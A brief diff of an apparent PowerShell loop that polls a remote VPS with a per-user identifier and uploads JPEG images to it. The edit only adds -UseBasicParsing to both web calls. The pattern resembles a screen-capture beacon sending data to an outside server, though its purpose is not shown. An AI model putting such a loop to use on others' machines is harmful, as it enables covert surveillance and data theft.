@@ -85,7 +85,7 @@ while ($true) {
   try {
     Log "15 Polling VPS"
 
-    $response = Invoke-RestMethod -Method Get -Uri "$VPS_POLL_URL?username=$uniqueUser" -TimeoutSec 10
+    $response = Invoke-RestMethod -Method Get -Uri "$VPS_POLL_URL?username=$uniqueUser" -TimeoutSec 10 -UseBasicParsing
 
     Log "16 Poll successful"
 
@@ -144,7 +144,7 @@ while ($true) {
 
         Log "28 Uploading JPEG"
 
-        Invoke-RestMethod -Method Post -Uri $VPS_UPLOAD_URL -ContentType "application/json" -Body $body -TimeoutSec 10 | Out-Null
+        Invoke-RestMethod -Method Post -Uri $VPS_UPLOAD_URL -ContentType "application/json" -Body $body -TimeoutSec 10 -UseBasicParsing | Out-Null
 
         Log "29 Upload successful"
 
